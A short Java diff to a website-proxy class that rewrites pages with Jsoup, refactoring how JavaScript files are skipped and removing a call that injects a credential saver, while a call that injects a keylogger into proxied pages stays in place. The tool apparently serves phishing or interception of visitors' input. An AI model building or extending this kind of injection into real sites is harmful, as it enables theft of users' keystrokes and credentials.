@@ -81,15 +81,17 @@ public class WebsiteProcessor {
 			response.sendRedirect(url);
 			return;
 		}
-		String modifiedHtml = processHTML(ri, html, url.contains(".js"),ci);
+		String modifiedHtml = processHTML(ri, html,ci);
 		response.getWriter().write(modifiedHtml);
 	}
-	public String processHTML(RequestInfo ri, String html,boolean isJS,ClientInfo ci){
+	public String processHTML(RequestInfo ri, String html,ClientInfo ci){
 		String html1 = html;
 		
-		if(isJS){
+		if(ri.url.contains(".js")){
 			return html1;
 		}
+		//TODO: add if it is an image 
+		
 		Document doc = Jsoup.parse(html1);
 		
 		//add jquery
@@ -115,9 +117,6 @@ public class WebsiteProcessor {
 		//keylogger code
 		if(config.keylogger){
 			addKeylogger(ri,doc);
-		}
-		if(config.saveCred){
-			addCredSaver(ri,doc);
 		}
 		//popup message
 		if(config.popUpMessage!=null && !config.popUpMessage.equals("")){
